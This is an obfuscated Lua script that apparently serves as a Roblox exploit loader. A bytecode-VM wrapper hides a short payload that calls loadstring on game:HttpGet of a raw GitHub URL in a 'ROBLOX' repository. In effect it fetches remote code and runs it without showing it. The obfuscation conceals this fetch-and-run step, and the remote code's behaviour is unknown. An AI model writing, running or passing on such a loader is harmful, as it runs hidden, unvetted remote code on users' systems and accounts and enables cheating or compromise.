do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v68=0;while true do if (v68==0) then v19=v0(v3(v30,1,1));return "";end end else local v69=0;local v70;while true do if (v69==0) then v70=v2(v0(v30,16));if v19 then local v99=0;local v100;while true do if (v99==1) then return v100;end if (v99==0) then v100=v5(v70,v19);v19=nil;v99=1;end end else return v70;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v71=(v31/(2^(v32-(2 -1))))%(((882 -(282 + 595)) -3)^(((v33-1) -(v32-(1 -0))) + ((1639 -(1523 + 114)) -1))) ;return v71-(v71%(620 -(555 + 64))) ;else local v72=931 -(857 + 74) ;local v73;while true do if (v72==0) then v73=(570 -(367 + 201))^(v32-(928 -(214 + 713))) ;return (((v31%(v73 + v73))>=v73) and (1 + 0)) or (0 + 0) ;end end end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35=0 + 0 + 0 ;local v36;local v37;while true do if (v35==(0 -0)) then v36,v37=v1(v16,v18,v18 + (1067 -(68 + 997)) );v18=v18 + (1272 -(226 + 1044)) ;v35=1;end if (v35==(4 -3)) then return (v37 * (373 -(32 + 85))) + v36 ;end end end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + 3 );v18=v18 + 1 + 3 ;return (v41 * 16777216) + (v40 * (66493 -(892 + 65))) + (v39 * (610 -354)) + v38 ;end local function v24()local v42=0 -0 ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(4 -(1 + 0))) then if (v47==(350 -(87 + 263))) then if (v46==(180 -((118 -51) + 113))) then return v48 * (0 + 0) ;else local v101=0 -0 ;while true do if (v101==(0 + (438 -(145 + 293)))) then v47=3 -2 ;v45=952 -(802 + 150) ;break;end end end elseif (v47==2047) then return ((v46==(0 -0)) and (v48 * ((1 -0)/(0 + 0)))) or (v48 * NaN) ;end return v8(v48,v47-1023 ) * (v45 + (v46/((999 -(915 + 82))^52))) ;end if (v42==(2 -1)) then v45=(431 -(44 + 386)) + 0 ;v46=(v20(v44,1 -0 ,1207 -((2555 -(998 + 488)) + 118) ) * ((4 -2)^(69 -37))) + v43 ;v42=1 + 1 ;end if (v42==(3 -1)) then v47=v20(v44,21 + 0 ,31);v48=((v20(v44,(262 + 561) -(368 + 423) )==(3 -2)) and  -(19 -(10 + 7 + 1))) or 1 ;v42=11 -8 ;end if (v42==(442 -((1188 -(201 + 571)) + (1164 -(116 + 1022))))) then v43=v23();v44=v23();v42=3 -2 ;end end end local function v25(v49)local v50=0 -0 ;local v51;local v52;while true do if (v50==(1 + 0)) then v51=v3(v16,v18,(v18 + v49) -(3 -2) );v18=v18 + v49 ;v50=7 -(1085 -(1020 + 60)) ;end if (v50==(862 -(814 + 45))) then return v6(v52);end if (v50==2) then v52={};for v77=1, #v51 do v52[v77]=v2(v1(v3(v51,v77,v77)));end v50=7 -4 ;end if (v50==0) then v51=nil;if  not v49 then local v93=0 + (1423 -(630 + 793)) ;while true do if ((0 + 0)==v93) then v49=v23();if (v49==(885 -(261 + 624))) then return "";end break;end end end v50=1 -0 ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v53=0 + 0 ;local v54;local v55;local v56;local v57;local v58;local v59;while true do local v67=0 + 0 ;while true do if (v67~=1) then else if ((1 -0)~=v53) then else local v97=0;local v98;while true do if (v97~=(0 -0)) then else v98=0;while true do if (1==v98) then local v143=0 -0 ;while true do if (v143==0) then for v156=1,v58 do local v157=0;local v158;local v159;while true do if (1==v157) then if (v158==(1 + 0)) then v159=v21()~=0 ;elseif (v158==(2 + 0)) then v159=v24();elseif (v158==(399 -(115 + 281))) then v159=v25();end v59[v156]=v159;break;end if (v157==(0 -0)) then local v166=0 + 0 ;while true do if (v166==(0 -0)) then v158=v21();v159=nil;v166=1;end if (v166==(3 -2)) then v157=1;break;end end end end end v57[3]=v21();v143=868 -(550 + 317) ;end if (v143~=1) then else v98=2;break;end end end if ((2 -0)~=v98) then else v53=2 -0 ;break;end if (v98~=0) then else v58=v23();v59={};v98=1;end end break;end end end break;end if (v67==0) then if (v53==0) then v54={};v55={};v56={};v57={v54,v55,nil,v56};v53=1;end if (v53==2) then for v102=1,v23() do local v103=0;local v104;local v105;local v106;while true do if (v103==(0 -0)) then v104=0;v105=nil;v103=1991 -(582 + 1408) ;end if (v103==1) then v106=nil;while true do if (v104==1) then while true do if (v105~=0) then else v106=v21();if (v20(v106,1,1)~=0) then else local v160=0;local v161;local v162;local v163;local v164;while true do if ((6 -4)~=v160) then else while true do if (3==v161) then if (v20(v163,3 -0 ,11 -8 )~=(1825 -(1195 + 629))) then else v164[5 -1 ]=v59[v164[245 -(187 + 54) ]];end v54[v102]=v164;break;end if (v161~=(781 -(162 + 618))) then else local v170=0;local v171;while true do if (v170==0) then v171=0 + 0 ;while true do if (v171==1) then v161=2 + 0 ;break;end if (v171==(0 -0)) then local v179=0;while true do if (v179~=(0 -0)) then else v164={v22(),v22(),nil,nil};if (v162==0) then local v180=1000 -(451 + 549) ;while true do if (v180==(0 + 0)) then v164[3]=v22();v164[4]=v22();break;end end elseif (v162==1) then v164[3]=v23();elseif (v162==2) then v164[3]=v23() -(2^(24 -8)) ;elseif (v162==3) then local v185=0 -0 ;local v186;local v187;while true do if (v185~=0) then else v186=0;v187=nil;v185=1385 -(746 + 638) ;end if (v185==1) then while true do if (v186~=(0 + 0)) then else v187=0;while true do if (v187~=(0 -0)) then else v164[3]=v23() -((343 -(218 + 123))^16) ;v164[1585 -(1535 + 46) ]=v22();break;end end break;end end break;end end end v179=1 + 0 ;end if (v179~=1) then else v171=1;break;end end end end break;end end end if (v161==(1 + 1)) then local v172=560 -(306 + 254) ;while true do if (v172==(0 + 0)) then if (v20(v163,1,1)==1) then v164[2]=v59[v164[3 -1 ]];end if (v20(v163,2,2)==(1468 -(899 + 568))) then v164[2 + 1 ]=v59[v164[7 -4 ]];end v172=604 -(268 + 335) ;end if (v172==1) then v161=3;break;end end end if (v161~=0) then else v162=v20(v106,2,3);v163=v20(v106,4,296 -(60 + 230) );v161=573 -(426 + 146) ;end end break;end if (v160~=(1 + 0)) then else local v167=0;while true do if (v167==(1456 -(282 + 1174))) then v163=nil;v164=nil;v167=812 -(569 + 242) ;end if (v167==(2 -1)) then v160=1 + 1 ;break;end end end if (v160~=0) then else local v168=0;while true do if (0==v168) then v161=0;v162=nil;v168=1025 -(706 + 318) ;end if (v168~=(1252 -(721 + 530))) then else v160=1272 -(945 + 326) ;break;end end end end end break;end end break;end if (v104~=0) then else local v146=0 -0 ;while true do if (v146==(1 + 0)) then v104=701 -(271 + 429) ;break;end if (v146~=0) then else v105=0 + 0 ;v106=nil;v146=1;end end end end break;end end end for v107=1,v23() do v55[v107-(1501 -(1408 + 92)) ]=v28();end return v57;end v67=1087 -(461 + 625) ;end end end end local function v29(v60,v61,v62)local v63=0;local v64;local v65;local v66;while true do if (v63==0) then v64=v60[1];v65=v60[2];v63=1;end if (v63==1) then v66=v60[3];return function(...)local v79=v64;local v80=v65;local v81=v66;local v82=v27;local v83=1;local v84= -1;local v85={};local v86={...};local v87=v12("#",...) -1 ;local v88={};local v89={};for v94=0,v87 do if (v94>=v81) then v85[v94-v81 ]=v86[v94 + 1 ];else v89[v94]=v86[v94 + 1 ];end end local v90=(v87-v81) + 1 ;local v91;local v92;while true do v91=v79[v83];v92=v91[1];if (v92<=3) then if (v92<=1) then if (v92>0) then v89[v91[2]]();else local v113=v91[2];local v114=v89[v91[3]];v89[v113 + 1 ]=v114;v89[v113]=v114[v91[4]];end elseif (v92==2) then do return;end else v89[v91[2]]=v62[v91[3]];end elseif (v92<=5) then if (v92==4) then local v120;local v121,v122;local v123;local v124;v89[v91[2]]=v62[v91[3]];v83=v83 + 1 ;v91=v79[v83];v89[v91[2]]=v62[v91[3]];v83=v83 + 1 ;v91=v79[v83];v124=v91[2];v123=v89[v91[3]];v89[v124 + 1 ]=v123;v89[v124]=v123[v91[4]];v83=v83 + 1 ;v91=v79[v83];v89[v91[2]]=v91[3];v83=v83 + 1 ;v91=v79[v83];v124=v91[2];v121,v122=v82(v89[v124](v13(v89,v124 + 1 ,v91[3])));v84=(v122 + v124) -1 ;v120=0;for v144=v124,v84 do local v145=0;while true do if (v145==0) then v120=v120 + 1 ;v89[v144]=v121[v120];break;end end end v83=v83 + 1 ;v91=v79[v83];v124=v91[2];v89[v124]=v89[v124](v13(v89,v124 + 1 ,v84));v83=v83 + 1 ;v91=v79[v83];v89[v91[2]]();v83=v83 + 1 ;v91=v79[v83];do return;end else v89[v91[2]]=v91[3];end elseif (v92==6) then local v136=0;local v137;local v138;local v139;local v140;while true do if (v136==1) then v84=(v139 + v137) -1 ;v140=0;v136=2;end if (v136==2) then for v153=v137,v84 do v140=v140 + 1 ;v89[v153]=v138[v140];end break;end if (v136==0) then v137=v91[2];v138,v139=v82(v89[v137](v13(v89,v137 + 1 ,v91[3])));v136=1;end end else local v141=0;local v142;while true do if (v141==0) then v142=v91[2];v89[v142]=v89[v142](v13(v89,v142 + 1 ,v84));break;end end end v83=v83 + 1 ;end end;end end end return v29(v28(),{},v17)(...);end v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F6E2O6F623631363136312F524F424C4F582F6D61696E2F736F656B646E786E4549442F4F5344692O652E6C756100083O0012043O00013O00122O000100023O00202O00010001000300122O000300046O000100039O0000026O000100016O00017O00",v9(),...);end
